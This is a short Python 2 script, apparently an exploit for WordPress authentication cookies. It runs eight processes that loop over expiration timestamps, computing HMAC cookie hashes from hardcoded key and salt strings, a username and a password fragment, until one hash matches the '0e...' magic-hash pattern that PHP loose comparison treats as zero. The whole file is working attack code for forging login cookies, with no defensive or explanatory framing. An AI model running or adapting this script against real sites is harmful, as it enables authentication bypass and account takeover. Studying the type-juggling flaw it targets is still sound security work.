import re,hmac
from multiprocessing import Process,Value
from sys import stdout


user = 'ettack'
pass_frag = 'u5dr'

pnum = 8
exprstart = 1400000000

def gen_cookie(user,exptime,pass_frag):
    lk = 'dBr|SFMq6`VaOFKw>r~^Npl(-z &OA(9{(W &(?2h&I}v1!V+Kx.m|uV-:z89L72'
    ls = 'a=ec%X>I>#/@z>b);!*Qk*!&zS)@3[wW+o+2@gFz5xK$v&P@kV@I(YkJV4i9<Qp6'
    key = hmac.new(lk+ls,user+pass_frag+'|'+str(exptime)).hexdigest()
    hs = hmac.new(key,user+'|'+str(exptime)).hexdigest()
    return hs

def loop(tid,flag):
    exptime = exprstart+tid
    while flag.value==0:
        if (exptime % 10000 == 0):
            stdout.flush()
            stdout.write("\rTrying:  "+str(exptime))

        hs = gen_cookie(user,exptime,pass_frag)

        if (re.search('^0+e\d*$',hs)):
            print "\n\nAfter "+str(exptime-exprstart)+" tries, we found: \n"
            print "Expiration: "+str(exptime)+"\n"
            print "Hash: "+hs+"\n"
            flag.value = 1

        exptime += pnum


if __name__ == '__main__':
    processes = []
    flag = Value('i',0)
    for i in xrange(pnum):
        p = Process(target=loop,args=(i,flag))
        processes.append(p)
        p.start()

    for p in processes:
        p.join()

